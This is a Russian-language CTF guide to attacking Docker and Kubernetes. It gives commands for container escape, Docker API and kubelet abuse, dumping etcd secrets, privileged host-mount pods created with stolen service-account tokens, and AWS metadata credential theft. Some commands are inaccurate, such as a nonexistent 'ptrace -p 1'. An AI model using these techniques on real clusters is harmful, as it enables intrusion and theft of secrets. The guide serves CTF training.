### Расширенный разбор Docker в CTF

#### Механика контейнеризации и точки входа
Docker использует Linux-механизмы для изоляции:
- **Namespaces**: Изолируют процессы (PID), сеть (NET), файловую систему (MNT).
- **Cgroups**: Ограничивают ресурсы (CPU, память).
- **Capabilities**: Определяют привилегии (например, `CAP_SYS_ADMIN`).

В CTF часто встречаются задачи, где эти механизмы настроены некорректно, что позволяет "вырваться" из контейнера.

##### Пример: Выход за пределы контейнера через Capabilities
Если контейнер запущен с расширенными capabilities (например, `CAP_SYS_PTRACE`), можно вмешаться в процессы хоста:
```bash
ls -l /proc/1/exe  # Проверяем доступ к хост-процессам
ptrace -p 1  # Прицепляемся к init-процессу хоста
```
Если `CAP_SYS_ADMIN` включен, попробуйте манипулировать ядром:
```bash
echo 0 > /proc/sys/kernel/yama/ptrace_scope  # Отключаем защиту
```

##### Docker Bench Security
В реальных системах используют инструменты вроде `docker-bench-security` для аудита. В CTF вы можете сами проверить:
- Есть ли `--pid=host` или `--network=host`?
- Монтируется ли `/` или `/etc`?

#### Эксплуатация через Dockerfile
Иногда в задаче дают доступ к `Dockerfile`. Ищите уязвимости:
- **EXPOSE**: Открытые порты могут указывать на сервисы.
- **COPY**: Файлы, скопированные в контейнер, могут содержать флаг.
- **RUN**: Команды могут оставлять следы (например, `echo FLAG > /flag`).

Пример:
```dockerfile
FROM ubuntu
RUN echo "CTF{docker_leak}" > /secret.txt
CMD ["/bin/bash"]
```
Проверяйте:
```bash
cat /secret.txt
```

#### Docker API exploitation
Если вы нашли доступ к Docker API (например, через порт 2375), можно управлять хостом:
```bash
curl -X GET http://localhost:2375/containers/json  # Список контейнеров
curl -X POST http://localhost:2375/containers/create -d '{"Image": "alpine", "Cmd": ["cat", "/host/flag.txt"], "Binds": ["/:/host"]}'
```
Запустите контейнер и получите результат.

---

### Глубокий разбор Kubernetes в CTF

#### Архитектура Kubernetes
Понимание компонентов K8s критично для CTF:
- **API Server**: Центральный узел управления (порт 6443 или 443).
- **etcd**: Хранилище конфигураций и Secrets (порт 2379).
- **Kubelet**: Агент на нодах (порт 10250).
- **Pod**: Минимальная единица, содержащая контейнеры.

#### Расширенные векторы атак

##### 1. Атака через etcd
Если в задаче доступен порт 2379 (etcd), вы можете извлечь все данные кластера:
```bash
etcdctl --endpoints=http://127.0.0.1:2379 get --prefix /registry
```
Флаги часто хранятся в Secrets:
```bash
etcdctl --endpoints=http://127.0.0.1:2379 get /registry/secrets/default/flag-secret
```

##### 2. Kubelet exploitation
Kubelet (порт 10250) иногда открыт без аутентификации. Проверяйте:
```bash
curl -k https://<node-ip>:10250/pods
```
Если доступ есть, создайте Pod или выполните команду в существующем:
```bash
curl -X POST -k https://<node-ip>:10250/run/<namespace>/<pod>/<container> -d "cmd=cat+/flag.txt"
```

##### 3. Service Account Token Abuse
Токены сервисных аккаунтов — золотая жила в K8s-задачах. Они монтируются по умолчанию, если не отключены (`automountServiceAccountToken: false`). Используйте их для:
- Перечисления ресурсов:
  ```bash
  curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/pods
  ```
- Создания привилегированного Pod’а:
  ```bash
  cat <<EOF | curl -k -H "Authorization: Bearer $TOKEN" -X POST https://kubernetes.default.svc/api/v1/namespaces/default/pods -d @-
  {
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {"name": "pwn"},
    "spec": {
      "containers": [
        {
          "name": "pwn",
          "image": "ubuntu",
          "command": ["bash", "-c", "cat /host/flag.txt"],
          "volumeMounts": [{"name": "host", "mountPath": "/host"}]
        }
      ],
      "volumes": [{"name": "host", "hostPath": {"path": "/"}}]
    }
  }
  EOF
  ```

##### 4. Misconfigured Metadata API
В облачных провайдерах (AWS, GCP) Pod’ы могут обращаться к Metadata API. Например, в AWS:
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
Если роль IAM настроена неправильно, вы получите ключи для доступа к другим ресурсам.

##### 5. Sidecar-контейнеры
Иногда в Pod’е есть дополнительные контейнеры (sidecars). Проверяйте их:
```bash
kubectl describe pod <pod-name>
```
Если один из них привилегирован, используйте его для атаки.

---

#### Инструменты для анализа K8s
- **kubectx/kubens**: Быстрое переключение контекстов и namespace’ов.
- **k9s**: Терминал для управления кластером.
- **Trivy**: Сканер уязвимостей в контейнерах.
- **Metasploit**: Модули для Docker/K8s (например, `exploit/linux/http/docker_daemon_tcp`).

---

### Сложные сценарии CTF

#### Сценарий 1: Docker + K8s + Web
Вы подключаетесь к веб-приложению в контейнере:
```bash
curl http://app.local
```
Находите LFI (Local File Inclusion):
```bash
curl http://app.local/file?path=/proc/self/environ
```
Из переменных окружения получаете токен K8s (`KUBERNETES_SERVICE_TOKEN`). Используете его для создания Pod’а и чтения `/flag.txt` на хосте.

#### Сценарий 2: CRI-O вместо Docker
Вместо Docker используется CRI-O (альтернативный контейнерный runtime). Проверяйте:
```bash
crictl ps  # Список контейнеров
crictl exec -it <container-id> /bin/sh
```
Если CRI-O настроен с `--privileged`, выходите на хост через `/proc`.

#### Сценарий 3: Taint/Toleration Abuse
В задаче вы видите, что мастер-нода доступна для запуска Pod’ов (нет taint’ов). Создайте Pod с `nodeName: master`:
```yaml
spec:
  nodeName: master
  containers:
  - name: pwn
    image: alpine
    command: ["cat", "/etc/kubernetes/admin.conf"]
```
Извлеките конфиг и получите полный контроль.

---

### Практические советы
1. **Логи**: Проверяйте `/var/log` в контейнере или Pod’е — там могут быть подсказки.
2. **Kernel exploits**: Если версия ядра устарела (узнать через `uname -r`), ищите эксплойты (например, Dirty COW).
3. **Debugging**: Используйте `strace` или `gdb` для анализа бинарников внутри контейнера.

---

### Дополнительные ресурсы
- **HackTricks**: hacktricks.xyz (разделы Docker/Kubernetes).
- **PayloadsAllTheThings**: github.com/swisskyrepo/PayloadsAllTheThings (K8s Exploits).
- **CTFtime**: Архив задач с облачными темами.

### Задачи для практики
- **Kubernetes Goat** (github.com/madhuakula/kubernetes-goat)
	Коллекция уязвимых K8s-сценариев с пошаговыми решениями.
- **TryHackMe** (tryhackme.com)  
	Комнаты: "Kubernetes Basics", "Docker Security".
- **CTFtime** (ctftime.org)  
	Архив задач с прошедших соревнований (фильтр по "cloud" или "container").
